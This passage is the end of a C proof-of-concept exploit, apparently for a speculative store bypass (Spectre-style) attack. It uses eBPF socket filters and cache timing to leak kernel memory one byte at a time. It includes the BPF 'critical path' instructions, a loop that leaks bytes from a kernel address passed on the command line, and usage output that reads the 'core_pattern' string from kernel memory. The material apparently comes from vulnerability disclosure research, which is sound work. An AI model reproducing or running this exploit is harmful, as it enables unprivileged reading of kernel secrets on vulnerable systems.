      BPF_MOV64_REG(BPF_REG_1, BPF_REG_SLOW_SLOT),
      BPF_EMIT_CALL(4/*clflush_mfence*/),

      BPF_MOV64_REG(BPF_REG_DUMMY_SLOT, BPF_REG_FP),
      BPF_ALU64_IMM(BPF_ADD, BPF_REG_DUMMY_SLOT, -216),

      /* START CRITICAL PATH */
      BPF_LDX_MEM(BPF_DW, BPF_REG_CONFUSED_SLOT_ALIAS,
BPF_REG_SLOW_SLOT, 0), /* high-latency read of slot address */
      BPF_STX_MEM(BPF_DW, BPF_REG_CONFUSED_SLOT_ALIAS,
BPF_REG_DUMMY_SLOT, 0), /* bypassed store via high-latency address */
      BPF_LDX_MEM(BPF_DW, BPF_REG_CONFUSED, BPF_REG_CONFUSED_SLOT, 0),

      BPF_LDX_MEM(BPF_B, BPF_REG_SECRET_VALUE, BPF_REG_CONFUSED, 0),
      BPF_ALU64_IMM(BPF_AND, BPF_REG_SECRET_VALUE, 1<<selected_bit),
/* 0 or 1 */
      BPF_ALU64_IMM(BPF_LSH, BPF_REG_SECRET_VALUE, 12-selected_bit),
/* 0 or 0x1000 */
      BPF_ALU64_REG(BPF_ADD, BPF_REG_LEAK_ARRAY, BPF_REG_SECRET_VALUE),
      BPF_LDX_MEM(BPF_B, BPF_REG_0, BPF_REG_LEAK_ARRAY, 0),
      /* END CRITICAL PATH */

      BPF_MOV64_IMM(BPF_REG_0, 0),
      BPF_EXIT_INSN()
    };
    sockfds[i] = create_filtered_socket_fd(insns, ARRSIZE(insns));
    puts("BPF PROG LOADED SUCCESSFULLY");
  }

/*
  puts("testing flushed...\n");
  for (int i=-1; i<10; i++) {
    unsigned int res = array_time_flush_loc(leak_map, 0, 2048);
    if (i >= 0)
      printf("  %u\n", res);
  }
*/

  unsigned long base_addr = strtoull(argv[1], NULL, 16);
  for (int i=0; i<atoi(argv[2]); i++) {
    unsigned long addr = base_addr + i;
    unsigned char leaked = leak_byte(addr);
    printf("%016lx: 0x%02hhx ('%c')\n", addr, leaked, leaked);
  }


  return 0;
}

*/
-----------------------    END    -----------------------

PoC usage:

$ sudo grep core_pattern /proc/kallsyms
ffffffff9b2954e0 D core_pattern
$ gcc -o bpf_store_skipper_assisted bpf_store_skipper_assisted.c
$ time ./bpf_store_skipper_assisted ffffffff9b2954e0 5
BPF PROG LOADED SUCCESSFULLY
BPF PROG LOADED SUCCESSFULLY
BPF PROG LOADED SUCCESSFULLY
BPF PROG LOADED SUCCESSFULLY
BPF PROG LOADED SUCCESSFULLY
BPF PROG LOADED SUCCESSFULLY
BPF PROG LOADED SUCCESSFULLY
BPF PROG LOADED SUCCESSFULLY
BPF PROG LOADED SUCCESSFULLY
BPF PROG LOADED SUCCESSFULLY
BPF PROG LOADED SUCCESSFULLY
BPF PROG LOADED SUCCESSFULLY
BPF PROG LOADED SUCCESSFULLY
BPF PROG LOADED SUCCESSFULLY
BPF PROG LOADED SUCCESSFULLY
BPF PROG LOADED SUCCESSFULLY
4 vs 96
1 vs 99
100 vs 0
100 vs 0
100 vs 0
2 vs 98
0 vs 100
100 vs 0
ffffffff9b2954e0: 0x63 ('c')
2 vs 98
1 vs 99
1 vs 99
1 vs 99
100 vs 0
2 vs 98
0 vs 100
100 vs 0
ffffffff9b2954e1: 0x6f ('o')
100 vs 0
3 vs 97
100 vs 0
100 vs 0
1 vs 99
2 vs 98
0 vs 100
100 vs 0
ffffffff9b2954e2: 0x72 ('r')
2 vs 98
100 vs 0
0 vs 100
100 vs 0
100 vs 0
0 vs 100
0 vs 100
100 vs 0
ffffffff9b2954e3: 0x65 ('e')
100 vs 0
100 vs 0
100 vs 0
100 vs 0
100 vs 0
100 vs 0
100 vs 0
100 vs 0
ffffffff9b2954e4: 0x00 ('')

real    0m31.591s
user    0m2.547s
sys     0m27.429s
*/